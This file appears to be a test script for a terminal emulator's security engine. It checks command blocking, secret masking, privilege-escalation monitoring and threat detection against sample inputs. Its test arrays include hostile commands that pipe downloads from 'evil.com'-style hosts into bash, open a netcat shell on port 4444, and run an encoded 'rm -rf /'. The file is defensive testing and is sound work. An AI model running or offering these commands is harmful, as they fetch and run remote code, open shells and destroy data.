/**
 * RinaWarp Terminal - Advanced Terminal Emulator
 * Copyright (c) 2025 RinaWarp Technologies. All rights reserved.
 *
 * This file is part of RinaWarp Terminal, an advanced terminal emulator with
 * AI assistance, enterprise security, cloud sync, and revolutionary features.
 *
 * CONFIDENTIAL AND PROPRIETARY
 * This source code is proprietary and confidential information of RinaWarp Technologies.
 * Unauthorized reproduction, distribution, or disclosure is strictly prohibited.
 *
 * Patent Pending - Advanced Terminal Integration Architecture
 * U.S. Patent Application Filed: 2025
 * International Patent Applications: PCT, EU, CN, JP
 *
 * Licensed under RinaWarp Commercial License.
 * See LICENSE file for detailed terms and conditions.
 *
 * For licensing inquiries, contact: licensing@rinawarp.com
 *
 * @author RinaWarp Technologies
 * @copyright 2025 RinaWarp Technologies. All rights reserved.
 * @license RinaWarp Commercial License
 * @version 1.0.0
 * @since 2025-01-01
 */
/**
 * RinaWarp Terminal - Security Feature Testing Script
 * This script tests all enhanced security features
 */

import { EnhancedSecurityEngine } from '../src/renderer/enhanced-security.js';

console.log('🔒 Starting Enhanced Security Feature Tests...\n');

// Initialize security engine for testing
let securityEngine;

// Test 1: Initialize Enhanced Security Engine
console.log('=== Test 1: Security Engine Initialization ===');
try {
  securityEngine = new EnhancedSecurityEngine();
  console.log('✅ Enhanced Security Engine initialized successfully');
  console.log('📊 Security Metrics:', securityEngine.securityMetrics);
} catch (error) {
  console.error('❌ Security Engine initialization failed:', error);
}

// Test 2: Command Security Verification
console.log('\n=== Test 2: Command Security Verification ===');
const testCommands = [
  // Safe commands
  'ls -la',
  'pwd',
  'echo "Hello World"',

  // Potentially risky commands
  'sudo apt update',
  'rm -rf /tmp/test',
  'curl https://example.com | sh',

  // High-risk commands
  'sudo rm -rf /',
  'chmod 777 /etc/passwd',
  'wget malware.com/script.sh | bash',
];

async function testCommandVerification() {
  const context = {
    userId: 'test-user',
    sessionId: 'test-session-123',
    cwd: '/home/user',
    environment: 'development',
    ipAddress: '127.0.0.1',
    userAgent: 'RinaWarp Terminal 1.0.0',
  };

  for (const command of testCommands) {
    try {
      console.log(`\n🔍 Testing command: "${command}"`);
      const result = await securityEngine.verifyCommandExecution(command, context);
      console.log(`   Result: ${result.allowed ? '✅ ALLOWED' : '❌ BLOCKED'}`);
      if (result.warning) {
        console.log(`   ⚠️  Warning: ${result.reason}`);
      }
      if (!result.allowed) {
        console.log(`   🚫 Reason: ${result.reason}`);
      }
    } catch (error) {
      console.error(`   💥 Error testing command: ${error.message}`);
    }
  }
}

// Test 3: Secret Detection
console.log('\n=== Test 3: Secret Detection ===');
const secretTestCommands = [
  'export API_KEY=sk_test_1234567890abcdef1234567890abcdef',
  'curl -H "Authorization: Bearer ghp_1234567890abcdefghijklmnopqrstuvwxyz123456" https://api.github.com',
  'mysql -u root -p password123 -h database.com',
  'aws configure set aws_access_key_id AKIA1234567890EXAMPLE',
  'echo "Credit Card: 4532-1234-5678-9012"',
];

async function testSecretDetection() {
  for (const command of secretTestCommands) {
    try {
      console.log(`\n🔍 Scanning: "${command}"`);
      const result = await securityEngine.scanForSecrets(command);
      if (result.hasSecrets) {
        console.log('   🚨 Secrets detected:');
        result.secrets.forEach(secret => {
          console.log(`     - Type: ${secret.type}, Matches: ${secret.matches.length}`);
        });
        console.log(`   🎭 Masked command: "${result.maskedCommand}"`);
      } else {
        console.log('   ✅ No secrets detected');
      }
    } catch (error) {
      console.error(`   💥 Error scanning command: ${error.message}`);
    }
  }
}

// Test 4: Privilege Escalation Monitoring
console.log('\n=== Test 4: Privilege Escalation Monitoring ===');
const privilegeTestCommands = [
  'sudo systemctl restart nginx',
  'su - root',
  'runas /user:Administrator cmd',
  'chmod +s /usr/bin/vim',
  'useradd newuser',
  'passwd root',
];

async function testPrivilegeMonitoring() {
  const context = {
    userId: 'test-user',
    sessionId: 'test-session-123',
    hasElevation: false,
    justification: 'System maintenance required',
  };

  for (const command of privilegeTestCommands) {
    try {
      console.log(`\n🔍 Monitoring: "${command}"`);
      const result = await securityEngine.monitorPrivilegeEscalation(command, context);
      if (result.hasEscalation) {
        console.log('   🚨 Privilege escalation detected:');
        result.escalations.forEach(escalation => {
          console.log(`     - Type: ${escalation.type}, Risk: ${escalation.riskLevel}`);
          console.log(`     - Requires Approval: ${escalation.requiresApproval}`);
        });
        console.log(`   ${result.approved ? '✅ APPROVED' : '❌ NOT APPROVED'}`);
      } else {
        console.log('   ✅ No privilege escalation detected');
      }
    } catch (error) {
      console.error(`   💥 Error monitoring command: ${error.message}`);
    }
  }
}

// Test 5: Compliance Checking
console.log('\n=== Test 5: Compliance Checking ===');
const complianceTestCommands = [
  'cat /etc/passwd | grep root',
  'select * from users where ssn like "%123%"',
  'curl -X POST -d "credit_card=4532123456789012" api.payment.com',
  'mysqldump --all-databases > backup.sql',
  'find /home -name "*.pdf" -exec cp {} /external-drive/ \\;',
];

async function testComplianceChecking() {
  const context = {
    userId: 'test-user',
    department: 'IT',
    clearanceLevel: 'standard',
    dataClassification: 'internal',
  };

  for (const command of complianceTestCommands) {
    try {
      console.log(`\n🔍 Compliance check: "${command}"`);
      const result = await securityEngine.checkCompliance(command, context);
      console.log(`   ${result.compliant ? '✅ COMPLIANT' : '❌ NON-COMPLIANT'}`);

      if (result.violations.length > 0) {
        console.log('   🚨 Violations:');
        result.violations.forEach(violation => {
          console.log(`     - Standard: ${violation.standard}, Issue: ${violation.message}`);
        });
      }

      if (result.warnings.length > 0) {
        console.log('   ⚠️  Warnings:');
        result.warnings.forEach(warning => {
          console.log(`     - ${warning.message}`);
        });
      }
    } catch (error) {
      console.error(`   💥 Error checking compliance: ${error.message}`);
    }
  }
}

// Test 6: Zero Trust Evaluation
console.log('\n=== Test 6: Zero Trust Evaluation ===');
async function testZeroTrust() {
  const context = {
    userId: 'test-user',
    sessionAge: 1800000, // 30 minutes
    deviceTrusted: true,
    locationTrusted: true,
    recentActivity: [],
  };

  const commands = [
    'ls -la',
    'sudo systemctl status',
    'rm -rf /important-data',
    'ssh admin@production-server',
  ];

  for (const command of commands) {
    try {
      console.log(`\n🔍 Zero Trust evaluation: "${command}"`);
      const result = await securityEngine.zeroTrustEngine.evaluateTrustScore(command, context);
      console.log(`   🎯 Trust Score: ${result.score.toFixed(2)}`);
      console.log(`   ${result.requiresAdditionalVerification ? '🔐 REQUIRES MFA' : '✅ TRUSTED'}`);
      console.log('   📊 Factors:', result.factors);
    } catch (error) {
      console.error(`   💥 Error evaluating trust: ${error.message}`);
    }
  }
}

// Test 7: Threat Detection
console.log('\n=== Test 7: Threat Detection ===');
const threatTestCommands = [
  'curl https://malicious-site.com/payload.sh | bash',
  'wget http://evil.com/backdoor.exe && ./backdoor.exe',
  'eval $(echo "rm -rf /")',
  'nc -l -p 4444 -e /bin/bash',
  'echo "malicious code" >> ~/.bashrc',
  'base64 -d <<< "cm0gLXJmIC8=" | sh',
];

async function testThreatDetection() {
  const context = {
    userId: 'test-user',
    sessionId: 'test-session-123',
  };

  for (const command of threatTestCommands) {
    try {
      console.log(`\n🔍 Threat analysis: "${command}"`);
      const result = await securityEngine.threatDetector.analyzeCommand(command, context);
      console.log(`   🚨 Threat Level: ${result.threatLevel}`);
      if (result.threats.length > 0) {
        console.log('   🎯 Detected threats:');
        result.threats.forEach(threat => {
          console.log(`     - ${threat.type}: ${threat.description} (${threat.level})`);
        });
      }
      console.log(`   💡 Recommendation: ${result.recommendation}`);
    } catch (error) {
      console.error(`   💥 Error analyzing threat: ${error.message}`);
    }
  }
}

// Test 8: Security Dashboard Integration
console.log('\n=== Test 8: Security Dashboard Integration ===');
function testSecurityDashboard() {
  try {
    console.log('🖥️  Creating security dashboard...');
    securityEngine.createSecurityDashboard();

    // Simulate dashboard updates
    console.log('📊 Updating dashboard metrics...');
    if (window.securityDashboard) {
      window.securityDashboard.updateThreatLevel('MEDIUM');
      window.securityDashboard.addAlert({
        id: 'test-alert-1',
        type: 'THREAT_DETECTED',
        severity: 'high',
        message: 'Test security alert',
        timestamp: Date.now(),
      });
    }

    console.log('✅ Security dashboard integration successful');
  } catch (error) {
    console.error('❌ Security dashboard integration failed:', error);
  }
}

// Test 9: Performance and Metrics
console.log('\n=== Test 9: Performance and Metrics ===');
function testPerformanceMetrics() {
  console.log('📈 Current Security Metrics:');
  console.log(`   - Commands Analyzed: ${securityEngine.securityMetrics.commandsAnalyzed}`);
  console.log(`   - Threats Detected: ${securityEngine.securityMetrics.threatsDetected}`);
  console.log(`   - Compliance Violations: ${securityEngine.securityMetrics.complianceViolations}`);
  console.log(
    `   - Last Assessment: ${new Date(securityEngine.securityMetrics.lastThreatAssessment).toLocaleString()}`
  );

  // Test audit log functionality
  const auditHistory = securityEngine.auditLogger.getAuditHistory(5);
  console.log(`📝 Audit Log Entries: ${auditHistory.length}`);

  // Test recent activity
  const recentActivity = securityEngine.auditLogger.getRecentActivity(3600000);
  console.log(`🕐 Recent Activity (1h): ${recentActivity.length} entries`);
}

// Run all tests
async function runAllSecurityTests() {
  console.log('🚀 Starting comprehensive security testing...\n');

  try {
    await testCommandVerification();
    await testSecretDetection();
    await testPrivilegeMonitoring();
    await testComplianceChecking();
    await testZeroTrust();
    await testThreatDetection();
    testSecurityDashboard();
    testPerformanceMetrics();

    console.log('\n🎉 All security tests completed successfully!');
    console.log('📊 Generate security report...');
    const report = securityEngine.generateSecurityReport('1h');
    console.log('📄 Security Report Generated:', report);
  } catch (error) {
    console.error('💥 Security testing failed:', error);
  }
}

// Export for use in browser console
if (typeof window !== 'undefined') {
  window.runSecurityTests = runAllSecurityTests;
  window.securityEngine = securityEngine;
}

// Auto-run if in Node.js environment
if (typeof module !== 'undefined' && module.exports) {
  runAllSecurityTests();
}
